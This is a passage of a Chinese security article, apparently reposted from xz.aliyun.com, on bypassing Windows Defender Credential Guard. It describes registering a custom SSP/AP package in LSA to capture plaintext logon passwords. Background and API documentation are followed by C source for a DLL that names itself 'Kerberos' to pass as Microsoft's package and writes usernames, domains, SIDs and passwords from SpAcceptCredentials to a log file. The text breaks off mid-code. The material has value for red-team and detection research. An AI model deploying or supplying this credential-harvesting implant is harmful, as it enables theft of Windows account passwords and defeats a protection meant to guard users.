---
title: Credential Guard Bypass From Custom SSP
url: https://buaq.net/go-147865.html
source: unSafe.sh - 不安全
date: 2023-02-04
fetch_date: 2025-10-04T05:39:49.013995
---

# Credential Guard Bypass From Custom SSP

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/aaf8d60f66899b6e36e07818e8de9d11.jpg)

Credential Guard Bypass From Custom SSP

0. 背景为了避免攻击者转储用户的凭据信息，从 Windows 10 1507 企业版和 Windows Server 2016 开始，微软引入了 Windows
*2023-2-3 21:4:0
Author: [xz.aliyun.com(查看原文)](/jump-147865.htm)
阅读量:24
收藏*

---

## 0. 背景

为了避免攻击者转储用户的凭据信息，从 Windows 10 1507 企业版和 Windows Server 2016 开始，微软引入了 Windows Defender Credential Guard 安全控制机制，其使用基于虚拟化的安全性来隔离机密，依次保护 NTLM 密码哈希、Kerberos TGT 票据和应用程序存储为域凭据的凭据来防止凭据盗窃、哈希传递或票据传递等攻击。

在 Windows 10 之前，LSA 将操作系统所使用的密码存储在其进程内存中。启用 Windows Defender Credential Guard 后，操作系统中的 LSA 进程与存储和保护这些密钥的新组件（称为隔离的 LSA 进程，Isolated LSA Process）进行通信。 独立 LSA 进程存储的数据使用基于虚拟化的安全性进行保护，操作系统的其余部分无法访问。 LSA 使用远程过程调用来与隔离的 LSA 进程进行通信。

下图简要概述了如何使用基于虚拟化的安全性来隔离 LSA：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230203205911-8dcb5650-a3c2-1.png)

> Source：[How Credential Guard works](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works)

如果我们在启用了 Credential Guard 的系统上尝试使用 Mimikatz 从 LSASS 进程内存中提取凭证，我们会观察到以下结果。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230203205933-9ad2ea34-a3c2-1.png)

如上图所示，我们无法从 LSASS 内存中提取任何凭据，NTLM 哈希处显示的是 “LSA Isolated Data: NtlmHash”。并且，即便已经通过修改注册表启用了 Wdigest，也依然获取不到任何明凭据。

为了进行比较，下图所示为不受 Credential Guard 保护的系统上的输出。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230203205946-a2c3995a-a3c2-1.png)

从 Windows 11 Enterprise, Version 22H2 和 Windows 11 Education, Version 22H 开始，兼容系统默认已启用 Windows Defender Credential Guard。

## 1. 基础知识

### 1.1 自定义安全包

自定义安全包 API 支持组合开发自定义安全支持提供程序（SSP），后者为客户端/服务器应用程序提供非交互身份验证服务和安全消息交换，以及开发自定义身份验证包，为执行交互式身份验证的应用程序提供服务。这些服务在单个包中合并时称为安全支持提供程序/身份验证包（SSP/AP）。

SSP/AP 中部署的安全包与 LSA 完全集成。使用可用于自定义安全包的 LSA 支持函数，开发人员可以实现高级安全功能，例如令牌创建、 补充凭据支持和直通身份验证。

如果我们自定义安全支持提供程序/身份验证包（SSP/AP），并将其注册到系统，当用户重新进行交互式身份验证时，系统就会同通过我们自定义的 SSP/AP 传递明文凭据，这意味着我们可以提取到明文凭据并将其保存下来。这样便可以绕过 Credential Guard 的保护机制。

SSP/AP 安全包，为了同时执行身份验证包（AP）和安全支持提供程序（SSP），可以作为操作系统的一部分以及作为用户应用程序的一部分执行。这两种执行模式分别称为 LSA 模式和用户模式。这里我们需要的是 LSA 模式。

下面简单介绍一下关于 LSA 模式的初始化。

### 1.2 LSA 模式初始化

启动计算机系统后，本地安全机构（LSA）会自动将所有已注册的安全支持提供程序/身份验证包（SSP/AP）的 DLL 加载到其进程空间中，下图显示了初始化过程。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230203210005-adb982ac-a3c2-1.png)

> “Kerberos” 表示 Microsoft Kerberos SSP/AP，“My SSP/AP” 表示包含两个自定义安全包的自定义 SSP/AP。

启动时，LSA 调用每个 SSP/AP 中的 [SpLsaModeInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-splsamodeinitializefn) 函数，以获取指向 DLL 中每个安全包实现的函数的指针，函数指针以 [SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/ns-ntsecpkg-secpkg_function_table) 结构数组的形式传递给 LSA。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230203210018-b5ea42b8-a3c2-1.png)

收到一组 [SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/ns-ntsecpkg-secpkg_function_table) 结构后，LSA 将调用每个安全包的 [SpInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-spinitializefn) 函数。LSA 使用此函数调用传递给每个安全包一个 [LSA\_SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/ns-ntsecpkg-lsa_secpkg_function_table) 结构，其中包含指向安全包调用的 LSA 函数的指针。除了存储指向 LSA 支持函数的指针外，自定义安全包还应使用 [SpInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-spinitializefn) 函数的实现来执行任何与初始化相关的处理。

在这里，我们的 SSP/AP 安全包需要实现下表中所示的几个函数。

| 由 SSP/AP 实现的函数 | 说明 |
| --- | --- |
| SpInitialize | 执行初始化处理，并提供一个函数指针列表。 |
| SpShutDown | 在卸载 SSP/AP 之前执行所需的任何清理。 |
| SpGetInfo | 提供有关安全包的一般信息，例如其名称、描述和功能。 |
| SpAcceptCredentials | 将为经过身份验证的安全主体存储的凭据传递给安全包。 |

### 1.3 由 SSP/AP 实现的函数

以下函数由我们自定义的安全支持提供程序/身份验证包（SSP/AP）实现，本地安全机构（LSA）通过使用 SSP/AP 的 SpLsaModeInitialize 函数提供的 `SECPKG_FUNCTION_TABLE` 结构来访问这些函数。

#### SpInitialize

SpInitialize 函数由本地安全机构（LSA）调用一次，用于执行任何与初始化相关的处理，并提供一个函数指针列表，其中包含安全包调用的 LSA 函数的指针。

函数声明如下：

```
NTSTATUS Spinitializefn(
  [in] ULONG_PTR PackageId,
  [in] PSECPKG_PARAMETERS Parameters,
  [in] PLSA_SECPKG_FUNCTION_TABLE FunctionTable
);
```

参数如下：

* [in] PackageId：LSA 分配给每个安全包的唯一标识符。该值在重新启动系统之前有效。
* [in] Parameters：指向包含主域和计算机状态信息的 `SECPKG_PARAMETERS` 结构的指针。
* [in] FunctionTable：指向可以安全包调用的 LSA 函数的指针列表。

#### SpShutDown

SpShutDown 函数在卸载安全支持提供程序/身份验证包 (SSP/AP) 之前，由本地安全机构（LSA）调用，用于在卸载 SSP/AP 之前执行所需的任何清理，以便释放资源。

函数声明如下：

```
NTSTATUS SpShutDown(void);
```

这个函数没有参数。

#### SpGetInfo

SpGetInfo 函数提供有关安全包的一般信息，例如其名称和功能描述。客户端调用安全支持提供程序接口（SSPI）的 QuerySecurityPackageInfo 函数时，将调用 SpGetInfo 函数。

函数声明如下：

```
NTSTATUS Spgetinfofn(
  [out] PSecPkgInfo PackageInfo
);
```

参数如下：

* [out] PackageInfo：指向由本地安全机构（LSA）分配的 SecPkgInfo 结构的指针，必须由包填充。

#### SpAcceptCredentials

SpAcceptCredentials 函数由本地安全机构（LSA）调用，以将为经过身份验证的安全主体存储的任何凭据传递给安全包。为 LSA 存储的每组凭据调用一次此函数。

函数声明如下：

```
NTSTATUS Spacceptcredentialsfn(
  [in] SECURITY_LOGON_TYPE LogonType,
  [in] PUNICODE_STRING AccountName,
  [in] PSECPKG_PRIMARY_CRED PrimaryCredentials,
  [in] PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials
);
```

参数如下：

* [in] LogonType：指示登录类型的 `SECURITY_LOGON_TYPE` 值。
* [in] AccountName：指向存储登录帐户名称的 `UNICODE_STRING` 结构的指针。
* [in] PrimaryCredentials：指向包含登录凭据的 `SECPKG_PRIMARY_CRED` 结构的指针。
* [in] SupplementalCredentials：指向包含特定于包的补充凭据的 `ECPKG_SUPPLEMENTAL_CRED` 结构的指针。

## 2. 编程实现

通过 C/C++ 创建一个名为 CustSSP 的 DLL 项目，实现自定义 SSP/AP 包。由于篇幅限制，笔者仅提供关键代码部分。

```
#include "pch.h"

static SECPKG_FUNCTION_TABLE SecPkgFunctionTable[] = {
    {
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    _SpInitialize, _SpShutDown, _SpGetInfo, _SpAcceptCredentials,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL
    }
};

NTSTATUS NTAPI _SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI _SpShutDown(void)
{
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI _SpGetInfo(PSecPkgInfoW PackageInfo)
{
    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wVersion = 1;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->Name = (SEC_WCHAR*)L"Kerberos";
    PackageInfo->Comment = (SEC_WCHAR*)L"Microsoft Kerberos V5.0";
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI _SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    const wchar_t* LSA_LOGON_TYPE[] = {
        L"UndefinedLogonType",
        L"Unknown !",
        L"Interactive",
        L"Network",
        L"Batch",
        L"Service",
        L"Proxy",
        L"Unlock",
        L"NetworkCleartext",
        L"NewCredentials",
        L"RemoteInteractive",
        L"CachedInteractive",
        L"CachedRemoteInteractive",
        L"CachedUnlock",
    };

    FILE* logfile;

    if (_wfopen_s(&logfile, L"CustSSP.log", L"a") == 0)
    {
        SspLog(
            logfile,
            L">>>>=================================================================\n"
            L"[+] Authentication Id : %u:%u (%08x:%08x)\n"
            L"[+] Logon Type        : %s\n"
            L"[+] User Name         : %wZ\n"
            L"[+] Domain            : %wZ\n"
            L"[+] Logon Server      : %wZ\n"
            L"[+] SID               : %s\n"
            L"[+] SSP Credential    : \n"
            L"\t* UserName    : %wZ\n"
            L"\t* Domain      : %wZ\n"
            L"\t* Password    : ",
            PrimaryCredentials->LogonId.HighPart,
            PrimaryCredentials->LogonId.LowPart,
            PrimaryCredentials->LogonId.HighPart,
            PrimaryCredentials->LogonId.LowPart,
            LSA_LOGON_TYPE[Lo...